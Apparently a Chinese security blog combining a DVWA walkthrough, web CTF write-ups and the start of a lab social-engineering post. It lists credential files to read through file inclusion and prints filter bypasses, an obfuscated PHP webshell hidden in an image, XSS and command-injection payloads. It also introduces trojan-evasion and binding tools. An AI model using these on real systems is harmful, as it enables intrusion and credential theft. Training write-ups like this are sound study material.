$_GET[ &#x27;page&#x27; ];?&gt; 我们首先点击file1.php，观察包含文件在url中。 因此我们可以构造url中的参数，找服务器中的敏感文件。 我们首先输入一个http://172.16.34.167/dvwa/vulnerabilities/fi/?page=/etc/passwd 可以看到报错信息，发现网站存放的绝对路劲。 以下贴出查到的一些敏感文件。 Windows: 12345678910111213141516171819202122c:/boot.ini #查看系统版本 c:/windows/php.ini #php配置信息 c:/windows/my.ini #MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 c:/winnt/php.ini c:/winnt/my.ini c:\\mysql\\data\\mysql\\user.MYD #mysql.user表中的数据库连接密码 c:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini #存储了虚拟主机网站路径和密码 c:\\Program Files\\Serv-U\\ServUDaemon.ini c:\\windows\\system32\\inetsrv\\MetaBase.xml #查看IIS的虚拟主机配置 c:\\windows\\repair\\sam #WINDOWS系统初次安装的密码 c:\\Program Files\\ Serv-U\\ServUAdmin.exe #6.0版本以前的serv-u管理员密码 c:\\Program Files\\RhinoSoft.com\\ServUDaemon.exe C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\*.cif文件 #存储了pcAnywhere的登陆密码 c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf 或C:\\apache\\conf\\httpd.conf #查看WINDOWS系统apache文件 c:/Resin-3.0.14/conf/resin.conf #查看jsp开发的网站resin文件配置信息. c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf #查看linux系统配置的JSP虚拟主机 d:\\APACHE\\Apache2\\conf\\httpd.conf C:\\Program Files\\mysql\\my.ini C:\\mysql\\data\\mysql\\user.MYD #存在MYSQL系统中的用户密码 C:\\Windows\\System32\\drivers\\etc\\hostswinserver配置Telnet信息 Linux/Unix: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576/usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 /usr/local/app/php5/lib/php.ini #PHP相关设置 /etc/sysconfig/iptables #从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf #apache配置文件 /etc/rsyncd.conf #同步程序配置文件 /etc/my.cnf #mysql的配置文件 /etc/redhat-release #系统版本 /etc/issue /etc/issue.netetc/passwd #存储操作系统用户信息,该文件为所有用户可见用户名: 密码 : uid : gid :用户描述：主目录：登陆shell密码：x表示暗文,相反为明文uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户 伪用户（psuedo users） bin #拥有可执行的用户命令文件 sys #拥有系统文件 adm #拥有账户文件 uucp #UUCP使用 Ip #Ip或lpd子系统使用 nobody #NFS使用 audit cron mail usenetgid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录 用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等 主目录：用户的起始工作目录 登陆shell： 常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell) /bin/sh #默认登录Shell /sbin/nologin #代表用户不能登录 /etc/shadowusername: passwd: lastchg: min: max: warn: inactive: expire: flag登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合&#123;./0-9A-Za-z&#125;中的字符/用户不能登录最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同最小时间间隔 - 两次修改口令之间所需的最小天数最大时间间隔 - 口令保持有效的最大天数警告时间 - 从系统开始警告用户到用户密码正式失效之间的天数不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数失效时间 - 账号的生存期。保留条目 - 无用字段/etc/group 存储有关本地用户组的信息一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员1）groupname GID #组名2）password #密码位置3）GID #组ID4）user #组成员 /usr/local/app/php5/lib/php.ini #PHP相关设置 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件 /usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机 /etc/sysconfig/iptables #查看防火墙策略 /root/.mysql_history、/root/.bash_history #Mysql账号密码信息 我们在这里还可以利用路径回溯：../../../../来寻找敏感文件。 在php的环境下，我们还可以读取php.ini，来查看php的配置。 php版本小于5.3.4，并且Magic_quote_gpc为off时，可以使用%00截断。 当配置中，allow_url_fopen与allow_url_include开启时，还可以包含远程服务器的文件，若对文件还没有检查，可导致远程代码执行。 Medium12345678910&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt; 可以看到，对传入参数进行了过滤，将http://、https://、../、..\\都进行了过滤，替换为空。 我们可以使用双写的方法进行绕过。如： htthttps://ps:// ..././ High12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; 发现通过fnmatch()只能包含file开头的文件，那么我们可以通过file协议来进行绕过。 http://172.16.34.167/dvwa/vulnerabilities/fi/page=file:///C:/flag/flag.txt 然后是任意代码执行，需要结合文件上传，然后找到上传文件的绝对路径，将文件用file协议包含进来。 Impossible12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; 使用了白名单的手段，只允许include.php、file1.php、file2php、file3.php。 File Uploadlowlow等级的没有任何的过滤和防护，所以首先尝试上传一句话，发现没法上传，可能和php的版本问题有关，我们之后又上传探针，成功。 Medium123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 我们可以看到源码中添加了过滤，只能上传类型为image/jpeg或image/png，并且文件的大小要小于100000。 考虑用bp抓包，然后更改Content-Type为image/jpeg来尝试绕过。 成功上传。 High1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 其中，需要介绍的函数有 函数 解释 substr(string, start, length) 在string中，从start处开始截取length长度的字符串返回。 strrpos(string, find) 查找find在string中最后出现的位置。 High等级将上传文件的文件后缀取出来，判断最后一个.后面的后缀是否为jpg、jpeg、png。若不是则无法上传。 因为最后是检验最后一个点后面的后缀名，因此可以考虑使用0x00截断。 关于0x00和%00的关系，我们可以在安~然的这篇博文上找到答案。 之后bp时间后发现没有实现，查资料发现是php&lt;5.3.4才可能存在此漏洞。 之后又尝试了图片马，结合文件包含漏洞进行测试，可上传成功，但是访问时报错，是语法问题，和引号有关。报错内容如下： 1&lt;?php $a1=&#x27;ass&#x27;;$a2=&#x27;ert&#x27;;$arr=array($a1.$a2=&gt;&quot;test&quot;);$arr1=array_flip($arr);$arr2=&quot;$arr1[test]&quot;;@$arr2($_POST[shell]); ?&gt; 1copy 1.jpg/b+shell.php/a 3.jpg 通过hackbar访问，成功，但是通过蚁剑连接的时候出现问题，返回为空。 Impossible1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;; //$target_file = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; $target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; $temp_file = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; else &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 我们审计源码，发现其中有Anti-CSRF来预防CSRF。 1$target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; 通过这步代码，将目标文件的名字最后改为MD5处理后的名字，后缀改为上传时的最后的后缀。同事临时文件tmp_file也进行相同的处理。 然后判断上传的后缀和文件类型是否符合图片的格式，符合条件，才进行存储。 XSS(Reflected)low我们首先输入1，测试发现，是将我们的输入直接输出在了html中，所以可以尝试写一段脚本进去。 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 成功。。。 Medium123456789101112&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 我们可以发现是将输入中存在的&lt;script&gt;更改为空。因此，我们可以输入 1&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;1&#x27;);&lt;/script&gt; 来绕过。 High123456789101112&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; High相对于Medium，从字符串的匹配，升级成了正则的匹配，只要是顺序是&lt;script，无论中间出现多少的字符，都会被替换为空。 因此我们可以尝试用其他的标签来绕过。 1&lt;img src=&quot;&quot; onerror=&quot;alert(&#x27;1&#x27;);&quot;&gt; Impossible123456789101112131415161718&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里提供作用的主要是函数htmlspecialchars()，该函数的作用是将一些预定义的字符转换为HTML实体。如： &amp;：转换为&amp;amp; &quot;：转换为&amp;quot; &#39;：转换为‘ &lt;：转换为&amp;lt; &gt;：转换为&amp;gt; XSS(Stored)low同反射型XSS一样，写入就可以了，下次再访问也可执行。 Medium123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 阅读源码，发现对message进行了htmlspecialchars()的调用，将字符串中间的特殊字符全转义为了html实体，因此message中不存在xss注入。但是name中只进行了str_replace()将&lt;script&gt;给过滤掉成了空，因此可以在name中进行注入。 1&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;1&#x27;);&lt;/script&gt; 写入时发现无法输入长字符串，F12打开源码发现 直接手动将maxlength调整为一个大数，如1000。 然后注入成功。 High123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 这里同反射型xss一样，既然屏蔽了script，那么我们可以通过其他的标签来实现。 1&lt;img src=&quot;&quot; onerror=&quot;alert(&#x27;1&#x27;);&quot;&gt; Impossible1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27; ); $data-&gt;bindParam( &#x27;:message&#x27;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:name&#x27;, $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里对message和name都通过htmlspecialchars()进行了html实体的转义，因此不存在xss注入。"},{"title":"攻防世界web新手题wp汇总","date":"09/02/2020","path":"2020/02/09/20200208181201/","text":"0x00 view_source题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 直接打开网站，F12查看源代码，发现flag：cyberpeace&#123;d54ad4fdb3a258685cbd1fd82817c5a5&#125;。 0x01 robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 分析描述，可以知道存在robots.txt文件，打开发现 可知道有文件flag_ls_h3re.php，直接打开该文件得到flag：cyberpeace&#123;165ec629b3fbc11e0b229a9a3c7283a6&#125;。 0x02 backup题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ 分析描述：php的备份文件有两种：*.php~和*.php.bak。 分别打开这两个文件，可以下载到index.php.bak文件，打开找到flag。 12345678910111213141516171819202122&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;备份文件&lt;&#x2F;title&gt; &lt;link href&#x3D;&quot;http:&#x2F;&#x2F;libs.baidu.com&#x2F;bootstrap&#x2F;3.0.3&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; &#x2F;&gt; &lt;style&gt; body&#123; margin-left:auto; margin-right:auto; margin-TOP:200PX; width:20em; &#125; &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h3&gt;你知道index.php的备份文件名吗？&lt;&#x2F;h3&gt;&lt;?php$flag&#x3D;&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 0x03 cookie题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ 分析描述，发现这道题目是要找cookie。访问靶机，F12在network中查看response头。 发现Set-Cookie: look-here=cookie.php，因此我们访问cookie.php。让我们查看response。找到flag：cyberpeace&#123;1b0103c4937fa3d11fc2d535cd5836bd&#125;。 0x04 disabled_button题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 打开目标网页，f12打开源代码发现： 1&lt;input disabled=&quot;&quot; class=&quot;btn btn-default&quot; style=&quot;height:50px;width:200px;&quot; type=&quot;submit&quot; value=&quot;flag&quot; name=&quot;auth&quot;&gt; 将disabled属性删除后，发现按钮可以点击，获取flag：cyberpeace&#123;6c7f92cbdd9571b6cf10ffb26846022f&#125;。 0x05 weak_auth题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 打开网页，发现是一个登录页面，结合描述，认为是弱口令。 123456789# 第一次测试username = 111password = 111# 返回信息：please login as admin#第二次测试username = adminpassword = admin# 返回信息：password error 现在，我们可以确定账户为admin。 现在我们可以通过弱口令工具爆破该密码。 WebCrack 具体的使用方法该工具的README.md中有，这里不再赘述。 跑出来，发现账号密码为：admin/123456。登录，得到flag：cyberpeace&#123;10d2ccedf1e3b82ef0e773e776e81386&#125;。 0x06 simple_php题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 打开网页发现php源码，$a和$b是通过$_GET[]得到的，所以可以在url中构造参数。 分析该题是php弱类型比较，a==0返回真，输出$flag1,4444a绕过is_numeric，并且大于1234，输出$flag2，得到flag:Cyberpeace&#123;647E37C7627CC3E4019EC69324F66C7C&#125;。 0x07 get_post题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 首先，明白两种提交方式：GET和POST。 GET方法提交时，参数会直接跟在url后面，例如：www.xxx.com/?a=1&amp;b=2&amp;c=3各参数用&amp;连接。 POST方法提交时，参数不会出现在url中，而是会以键值对的方式跟在请求头后面。 打开网页，提示以GET方式提交变量a，值为1，因此在url后添加?a=1。之后提示以POST请求提交变量b，值为2，这时通过chrome插件hackbar以POST方式提交b=2的请求，获取flag：cyberpeace&#123;dbbf28d1d2855295e7e749e836df3f6e&#125;。 0x08 xff_referer题目描述：X老师告诉小宁其实xff和referer是可以伪造的。 首先要明白xff和referer。 xff：x-forwarded-for，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 referer：告诉服务器该网页是从哪个页面链接过来的。 打开网页，提示IP地址必须为123.123.123.123，因此在请求头中添加x-forwarded-for:123.123.123.123。提交请求，提示必须来自https://www.google.com，因此请求头中添加referee：https://www.google.com，得到flag：cyberpeace&#123;b6aaf4c55f9cf5644e135c3b47a2f8d7&#125;。 本题通过chrome插件modheader实现对http header的修改。 0x09 webshell题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 由题目可知，已经有了一句话木马了，现在只需要会连接就可以。 可以用蚁剑连接，这里不介绍具体用法。 我们这里用chrome插件hackbar提交POST请求获取flag。 flag:cyberpeace&#123;fc2722f9d8c0a4ab3f099176c486ac61&#125; 0x10 command_execution题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 打开网页发现可以直接执行命令，通过;可以执行多个命令。 1234567# 首先找到flag.txt文件的位置;find / -name flag.txt# 返回：/home/flag.txt# 查看flag.txt内容;cat /home/flag.txt# 返回：cyberpeace&#123;f48d4d8ec8bc8697ab114c130789493f&#125; 0x11 simple_js题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 打开网页，F12打开源码，发现js源码。 123456789101112131415161718192021222324252627function dechiffre(pass_enc)&#123; var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;; var tab = pass_enc.split(&#x27;,&#x27;); var tab2 = pass.split(&#x27;,&#x27;); var i,j,k,l=0,m,n,o,p = &quot;&quot;; i = 0; j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; p += String.fromCharCode((o = tab2[i])); if(i == 5) break; &#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass;&#125;String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;));h = window.prompt(&#x27;Enter password&#x27;);alert( dechiffre(h) ); 该题为js代码审计，简化上面的代码可得： 1234567891011121314151617function dechiffre(pass_enc)&#123; var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;; var tab = pass_enc.split(&#x27;,&#x27;); var tab2 = pass.split(&#x27;,&#x27;); var i,j,k,l=0,m,n,o,p = &quot;&quot;; i = 0; n = tab2.length; for(i = 0; i &lt; n; i++ )&#123; p += String.fromCharCode(tab2[i]); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass;&#125;String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;));h = window.prompt(&#x27;Enter password&#x27;);alert( dechiffre(h) ); 可以发现无论输入什么，最后返回的值永远都是tab2，也就是pass处理后的值，而真正的flag是\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30。通过脚本跑出flag。 12345678910a = &#x27;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&#x27;# print(a)flag = &#x27;&#x27;a = a.split(&#x27;,&#x27;)for i in a: flag += chr(int(i))print(flag) flag：Cyberpeace&#123;786OsErtk12&#125; 后记若有web大佬看见，有任何建议都可以相互交流一下，江小白在这里拜谢。"},{"title":"记一次小小的社工行动","date":"05/02/2020","path":"2020/02/05/20200205215523/","text":"记一次小小的社工行动背景随着一个多月的时间，实验室渗透测试的任务随着A组大佬打通关，从远程的渗透工作也算是有了一个比较完美的结束。收集到了扫描、攻击等信息。为了丰富收集的攻击数据的完整性，因此随后开展了在3网段的社工攻击，以丰富收集到的攻击数据，为之后的知识图谱的构建打好基础。 技术手段主要技术 技术 描述 veil-evasion 一个生成木马工具，有着不少的payload和生成方式使用。 pyjoiner github上一个开源的项目，用以进行两个exe文件的捆绑，对后门木马进行一定的伪装，在传播过程中，减少被发现几率。 veil-evasionVeil Evasion是一个可执行文件，它被用来生成Metasploit的payload，能绕过常见杀软。 Veil-Evasion被原生设计为在kali上，但其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把payload文件用Pyinstaller或者Py2Exe转为可执行文件。 